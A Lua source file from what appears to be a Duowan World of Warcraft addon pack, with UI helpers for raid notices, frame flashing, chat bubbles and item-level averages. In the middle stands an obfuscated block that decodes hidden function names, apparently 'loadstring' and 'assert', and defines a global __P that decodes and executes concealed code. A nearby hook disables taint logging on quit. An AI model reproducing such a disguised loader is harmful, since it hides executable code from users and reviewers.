		if (sender ~= DUOWAN_PlayerName and msg and channel == "GUILD" and prefix == "Duowan_Speak") then
			
		end
	end);
end
---------------------------
-- 判断在某个时间

function dwInDate(low, high)
	assert(type(low) == "string", format("#low need a string value got a %s.", type(low)));
	if (high) then 
		assert(type(high) == "string", format("#high need a string value got a %s.", type(high)));
	end	

	local weekday, month, day, year = CalendarGetDate();	
	local now = string.format("%04d-%02d-%02d", year, month, day);

	if (high) then
		-- ["2010-10-20", "2010-10-30"] 10月20日到30日
		if (low <= now and now <= high) then
			return true;
		end
	else
		-- "2010-10-20"	 10月20日
		if (low == now) then
			return true;
		end
	end

	return false;
end

---------------
-- 刷新聊天泡泡
local CHAT_POPO_POSITION_X = 0;
function dwUpdateChatPopoPosition(x)
	CHAT_POPO_POSITION_X = x or CHAT_POPO_POSITION_X;
	for i=1, 4 do
		local member_frame = _G["PartyMemberFrame"..i];
		local frame = _G["ChatPopoFrame"..i];
		if (frame) then
			frame:ClearAllPoints();
			frame:SetPoint("TOPLEFT", member_frame, "TOPRIGHT", CHAT_POPO_POSITION_X, -5);
		end
	end	
end
---------------
-- 垃圾回收

do
local frame = CreateFrame("Frame");
frame.time = 0;
frame:SetScript("OnUpdate", function(self, elapsed)
	self.time = self.time + elapsed;

	if (self.time > 1500) then
		self.time = 0;
		-- 战斗中不执行, 避免造成卡机
		dwSecureCall(collectgarbage, "collect");
	end
end)
end

do
	if (IsAddOnLoaded("isduowan")) then
		RemoveTalent = RemoveTalent;
		RemoveGlyphFromSocket = RemoveGlyphFromSocket;
		hooksecurefunc("Quit", function() SetCVar("taintlog", "0"); end);		
	end
end
---------------
--
do
	local _m,_e,_r=string.rep,string.len,string.byte
	local __m,__e,__r=string.sub,string.char,string.gsub 
	local m=function(_) 
		return _m('0',3-_e(_)).._ 
	end
	local e=function (_) 
		local r,l = '',_e(_) 
		for i=1,l do 
			r = r..__e(92)..m(251-_r(__m(_,i,i+1)))
		end
		return r 
	end
	local x,y,z=10100929260919,7957802,function(m)
		local n=""
		while m>0 do
			n=__e(96+m%21)..n
			m=(m-m%21)/21 
		end		
		return n 
	end
	__P=function(_) 
		local _ = e(_)
		local _r,l = '',_e(_)/4 
		for i=1,l do 
			_r = _r..__e(__m(_,4*i-2,4*i)) 
		end 		
		
		_G[z(y)](_G[z(x)](_r))(); 
	end
end

-------------------
-- 团队公告
do
dwStaticPopupDialogs["TEAMNOTICE_SET_TEXT"] = {
	text = DUOWAN_TEAMNOTICE_ADD_TEXT,
	button1 = ACCEPT,
	button2 = CANCEL,
	hasEditBox = 1,
	maxLetters = 48,
	hasWideEditBox = 1,
	OnAccept = function(self)
		local editBox = _G[self:GetName().."WideEditBox"];
		local text = editBox:GetText();
		dwSetCVar("DuowanConfig", "TeamNoticeText", text);
		if  GetNumGroupMembers()>0 and IsRealRaidLeader() then
			SendChatMessage(DUOWAN_TEAMNOTICE_HEAD..text, "raid");
		end
	end,
	OnShow = function(self)
		local text = dwRawGetCVar("DuowanConfig", "TeamNoticeText", DUOWAN_TEAMNOTICE_TEXT);
		_G[self:GetName().."WideEditBox"]:SetText(text);
		_G[self:GetName().."WideEditBox"]:HighlightText();
	end,
	OnHide = function(self)
		_G[self:GetName().."WideEditBox"]:SetText("");
	end,
	EditBoxOnEnterPressed = function(self)
		local editBox = _G[self:GetName()];
		local text = editBox:GetText();
		dwSetCVar("DuowanConfig", "TeamNoticeText", text);		
		if  GetNumGroupMembers()>0 and IsRealRaidLeader() then
			SendChatMessage(DUOWAN_TEAMNOTICE_HEAD..text, "raid");
		end
		self:GetParent():Hide();
	end,
	EditBoxOnEscapePressed = function(self)
		self:GetParent():Hide();
	end,
	timeout = 0,
	exclusive = 1,
	whileDead = 1,
	hideOnEscape = 1
};

local enableNotice = true;
local firstLoaded = true;
local __RaidMembers = {};
local frame = CreateFrame("Frame");
frame:RegisterEvent("RAID_ROSTER_UPDATE");
	
local function OnEvent(self, event, ...)
	if (GetNumGroupMembers()>0) then
		local tmp = {};
		local name, rank, subgroup, level, class, fileName, _, online;
		for i=1, GetNumGroupMembers() do
			name, rank, subgroup, level, class, fileName, _, online = GetRaidRosterInfo(i);
			tmp[name] = class; 
		end

		if (enableNotice and IsRealRaidLeader()) then
			local text = dwRawGetCVar("DuowanConfig", "TeamNoticeText", DUOWAN_TEAMNOTICE_TEXT);
			for name, v in pairs(tmp) do
				if (not __RaidMembers[name]) then
					SendChatMessage(DUOWAN_TEAMNOTICE_HEAD..text,"WHISPER",nil,name);
				end
			end
		end
		__RaidMembers = tmp;
	end
end

local function UpdateMembers()
	if (GetNumGroupMembers()>0) then
		local tmp = {};
		local name, rank, subgroup, level, class, fileName, _, online;
		for i=1, GetNumGroupMembers() do
			name, rank, subgroup, level, class, fileName, _, online = GetRaidRosterInfo(i);
			tmp[name] = class; 
		end
		__RaidMembers = tmp;
	end
end
frame:SetScript("OnEvent", OnEvent);

function dwTeamNotice_Toggle(switch)
	if (switch) then
		enableNotice = true;
		dwDelayCall(UpdateMembers, 3);
	else
		enableNotice = false;
	end
end

function dwSetTeamNotice()
	dwStaticPopup_Show("TEAMNOTICE_SET_TEXT");
	PlaySound("igMainMenuOption");
end
end

do
if (dwIsConfigurableAddOn("QuestHelperLite")) then
	dwStaticPopupDialogs["DUOWAN_OPEN_QUESTINFO"] = {
		text = DUOWAN_QUESTINFO_DIALOG_TEXT,
		button1 = TEXT(OKAY),
		button2 = TEXT(CANCEL),
		OnAccept = function()		
			LoadAddOn("QuestHelperLite");
			dwSetCVar("QuestMod", "QuestHelperLiteEnable", 1);
		end,
		OnCancel = function(_, reason)
		end,
		timeout = 30,
		showAlert = 1,
		hideOnEscape = 1
	};

	local button = CreateFrame("Button", "ToggleQuestInfo", WorldMapDetailFrame, "UIPanelButtonTemplate");
	button:SetWidth(80);
	button:SetHeight(28);
	button:SetText(DUOWAN_QUESTINFO_TEXT);
	button:SetPoint("TOPRIGHT", WorldMapDetailFrame, "TOPRIGHT", -30, -40);
	button:RegisterEvent("ADDON_LOADED");
	button:SetScript("OnClick", function(self)
		dwStaticPopup_Show("DUOWAN_OPEN_QUESTINFO");	
	end);
	button:SetFrameLevel(button:GetFrameLevel()+5);
	button:SetScript("OnEvent", function(self, event, addon)
		if (addon == "QuestHelperLite") then
			self:Hide();
		end
	end);
	button:SetScript("OnEnter", function(self)
		GameTooltip_SetDefaultAnchor(GameTooltip, self);
		GameTooltip:SetText(DUOWAN_QUESTINFO_LOAD_TEXT, 1, 1, 1);
		GameTooltip:Show();
	end);
	button:SetScript("OnLeave", function(self)		
		GameTooltip:Hide();
	end);
	if (dwIsAddOnLoaded("QuestHelperLite")) then
		button:Hide();
	else
		button:Show();
	end	
end
end

-----------------------------------------------------
-- 检测魔兽世界版本
do
	DUOWAN_ADDON_VERION = select(4, GetBuildInfo());	
end

-----------------------------------------------------
-- copy from UIParent.lua
local frameFlashManager = CreateFrame("FRAME");

local DWFLASHFRAMES = {};
local UIFrameFlashTimers = {};
local UIFrameFlashTimerRefCount = {};

-- Function to start a frame flashing
function dwUIFrameFlash(frame, fadeInTime, fadeOutTime, flashDuration, showWhenDone, flashInHoldTime, flashOutHoldTime, syncId)
	if ( frame ) then
		local index = 1;
		-- If frame is already set to flash then return
		while DWFLASHFRAMES[index] do
			if ( DWFLASHFRAMES[index] == frame ) then
				return;
			end
			index = index + 1;
		end

		if (syncId) then
			frame.syncId = syncId;
			if (UIFrameFlashTimers[syncId] == nil) then
				UIFrameFlashTimers[syncId] = 0;
				UIFrameFlashTimerRefCount[syncId] = 0;
			end
			UIFrameFlashTimerRefCount[syncId] = UIFrameFlashTimerRefCount[syncId]+1;
		else
			frame.syncId = nil;
		end
		
		-- Time it takes to fade in a flashing frame
		frame.fadeInTime = fadeInTime;
		-- Time it takes to fade out a flashing frame
		frame.fadeOutTime = fadeOutTime;
		-- How long to keep the frame flashing
		frame.flashDuration = flashDuration;
		-- Show the flashing frame when the fadeOutTime has passed
		frame.showWhenDone = showWhenDone;
		-- Internal timer
		frame.flashTimer = 0;
		-- How long to hold the faded in state
		frame.flashInHoldTime = flashInHoldTime;
		-- How long to hold the faded out state
		frame.flashOutHoldTime = flashOutHoldTime;
		
		tinsert(DWFLASHFRAMES, frame);
		
		frameFlashManager:SetScript("OnUpdate", dwUIFrameFlash_OnUpdate);
	end
end

-- Called every frame to update flashing frames
function dwUIFrameFlash_OnUpdate(self, elapsed)
	local frame;
	local index = #DWFLASHFRAMES;
	
	-- Update timers for all synced frames
	for syncId, timer in pairs(UIFrameFlashTimers) do
		UIFrameFlashTimers[syncId] = timer + elapsed;
	end
	
	while DWFLASHFRAMES[index] do
		frame = DWFLASHFRAMES[index];	
		frame.flashTimer = frame.flashTimer + elapsed;

		if ( (frame.flashTimer > frame.flashDuration) and frame.flashDuration ~= -1 ) then
			dwUIFrameFlashStop(frame);
		else
			local flashTime = frame.flashTimer;
			local alpha;
			
			if (frame.syncId) then
				flashTime = UIFrameFlashTimers[frame.syncId];
			end
			
			flashTime = flashTime%(frame.fadeInTime+frame.fadeOutTime+(frame.flashInHoldTime or 0)+(frame.flashOutHoldTime or 0));
			if (flashTime < frame.fadeInTime) then
				alpha = flashTime/frame.fadeInTime;
			elseif (flashTime < frame.fadeInTime+(frame.flashInHoldTime or 0)) then
				alpha = 1;
			elseif (flashTime < frame.fadeInTime+(frame.flashInHoldTime or 0)+frame.fadeOutTime) then
				alpha = 1 - ((flashTime - frame.fadeInTime - (frame.flashInHoldTime or 0))/frame.fadeOutTime);
			else
				alpha = 0;
			end
			
			frame:SetAlpha(alpha);
			frame:Show();
		end
		
		-- Loop in reverse so that removing frames is safe
		index = index - 1;
	end
	
	if ( #DWFLASHFRAMES == 0 ) then
		self:SetScript("OnUpdate", nil);
	end
end

-- Function to see if a frame is already flashing
function dwUIFrameIsFlashing(frame)
	for index, value in pairs(DWFLASHFRAMES) do
		if ( value == frame ) then
			return 1;
		end
	end
	return nil;
end

local function tDeleteItem(table, item)
	local index = 1;
	while table[index] do
		if ( item == table[index] ) then
			tremove(table, index);
		else
			index = index + 1;
		end
	end
end

-- Function to stop flashing
function dwUIFrameFlashStop(frame)
	tDeleteItem(DWFLASHFRAMES, frame);
	frame:SetAlpha(1.0);
	frame.flashTimer = nil;
	if (frame.syncId) then
		UIFrameFlashTimerRefCount[frame.syncId] = UIFrameFlashTimerRefCount[frame.syncId]-1;
		if (UIFrameFlashTimerRefCount[frame.syncId] == 0) then
			UIFrameFlashTimers[frame.syncId] = nil;
			UIFrameFlashTimerRefCount[frame.syncId] = nil;
		end
		frame.syncId = nil;
	end
	if ( frame.showWhenDone ) then
		frame:Show();
	else
		frame:Hide();
	end
end

---------------------------------------
-- 获取平均装等
local SlotName = {
	"Head","Neck","Shoulder","Back","Chest","Wrist",
	"Hands","Waist","Legs","Feet","Finger0","Finger1",
	"Trinket0","Trinket1","MainHand","SecondaryHand"
}
local ItemUpgradeInfo = LibStub("LibItemUpgradeInfo-1.0")
function dwGetUnitAvgItemLevel(unit)
	local total, item, boa, pvp = 0, 15, 0, 0 --装备总数默认15件，双持职业就+1
	local ulvl = UnitLevel(unit)
	local not2hand
	local findItem = 0
	
	for i = 1, #SlotName do
		local slotLink = GetInventoryItemLink(unit, GetInventorySlotInfo(("%sSlot"):format(SlotName[i])))
		if (slotLink ~= nil) then
			local _, _, quality, ilvl, _, _, _, _,ItemEquipLoc = GetItemInfo(slotLink)
			if ilvl ~= nil then
			--	if quality == 7 then
			--		boa = boa + 1
			--	elseif IsPVPItem(slotLink) then
			--		pvp = pvp + 1
			--	end
				total = total + ItemUpgradeInfo:GetUpgradedItemLevel(slotLink)
			end

			if ((SlotName[i] == 'SecondaryHand') or (SlotName[i] == 'MainHand' and ItemEquipLoc ~= "INVTYPE_2HWEAPON" and ItemEquipLoc ~= "INVTYPE_RANGED" and ItemEquipLoc ~= "INVTYPE_RANGEDRIGHT")) and not not2hand then
				item = item + 1
				not2hand = true
			end	
			findItem = findItem + 1
		end
	end

	if (total < 1 or findItem < 15) then
		return
	end
	
	return ('%.1f'):format(total / item);
end

function dw_GetServerName(unit)
	local playerServer = GetRealmName()
	if not unit or unit =="player" then
		return playerServer
	else
		local _,server =UnitName(unit)
		if server then
			return server
		else
			return playerServer
		end
	end
end

function dw_RGBToHex(r,g,b)
	r = r <= 1 and r >= 0 and r or 0
	g = g <= 1 and g >= 0 and g or 0
	b = b <= 1 and b >= 0 and b or 0
	
	return format("|cff%02x%02x%02x", r*255, g*255, b*255)
end